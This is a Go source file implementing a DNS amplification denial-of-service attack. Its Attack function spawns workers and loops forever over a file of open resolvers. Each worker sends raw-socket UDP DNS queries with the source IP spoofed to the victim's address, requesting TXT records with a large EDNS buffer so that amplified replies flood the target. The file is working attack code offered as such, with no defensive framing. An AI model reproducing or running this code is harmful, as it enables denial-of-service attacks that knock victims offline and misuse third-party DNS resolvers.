package pkg

import (
	"bufio"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"log"
	"net"
	"os"
	"syscall"
)

func Attack(targetIP net.IP, targetPort int, workers int, resolversPath string) {
	log.Print("Started attack")
	resolvers := getResolvers(resolversPath)

	jobsChan := make(chan job)
	for i := 0; i < workers; i++ {
		go worker(jobsChan)
	}

	for {
		for _, resolver := range resolvers {
			jobsChan <- job{
				targetIP:   targetIP,
				targetPort: targetPort,
				resolver:   resolver,
			}
		}
	}
}

func openSocket() int {
	handle, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	if err != nil {
		log.Fatal("Error opening device. ", err)
	}
	return handle
}

func sendPacket(fd int, packet []byte, resolverIP net.IP) {
	targetAddr := ipv4ToSockAddr(resolverIP)
	err := syscall.Sendto(fd, packet, 0, &targetAddr)
	if err != nil {
		log.Fatal("Error sending packet to network device. ", err)
	}
}

func createPacket(targetIP net.IP, targetPort int, resolverIP net.IP) []byte {
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	ipLayer := &layers.IPv4{
		Version:  4,
		TTL:      255,
		SrcIP:    targetIP,
		DstIP:    resolverIP,
		Protocol: layers.IPProtocolUDP,
	}
	udpLayer := &layers.UDP{
		SrcPort: layers.UDPPort(targetPort),
		DstPort: layers.UDPPort(53),
	}
	dnsLayer := &layers.DNS{
		// Header fields
		ID:     42,
		QR:     false, // QR=0 is query
		OpCode: layers.DNSOpCodeQuery,
		RD:     true,
		// Entries
		Questions: []layers.DNSQuestion{
			{
				Name:  []byte("cloudflare.com"),
				Type:  layers.DNSTypeTXT,
				Class: 1,
			},
		},
		Additionals: []layers.DNSResourceRecord{
			{
				Type:  layers.DNSTypeOPT,
				Class: 4096,
			},
		},
	}
	err := udpLayer.SetNetworkLayerForChecksum(ipLayer)
	if err != nil {
		log.Fatalf("Failed to set network layer for checksum: %v\n", err)
	}

	err = gopacket.SerializeLayers(buf, opts, ipLayer, udpLayer, dnsLayer)
	if err != nil {
		log.Fatalf("Failed to serialize packet: %v\n", err)
	}
	packetData := buf.Bytes()
	// fmt.Println(hex.Dump(packetData))
	return packetData
}

func getResolvers(path string) []net.IP {
	resolvers := make([]net.IP, 0)
	file, err := os.Open(path)
	defer file.Close()
	if err != nil {
		log.Fatal(err)
	}

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		ip := net.ParseIP(scanner.Text())
		resolvers = append(resolvers, ip)
	}

	return resolvers
}

func ipv4ToSockAddr(ip net.IP) (addr syscall.SockaddrInet4) {
	addr = syscall.SockaddrInet4{Port: 0}
	copy(addr.Addr[:], ip.To4()[0:4])
	return addr
}
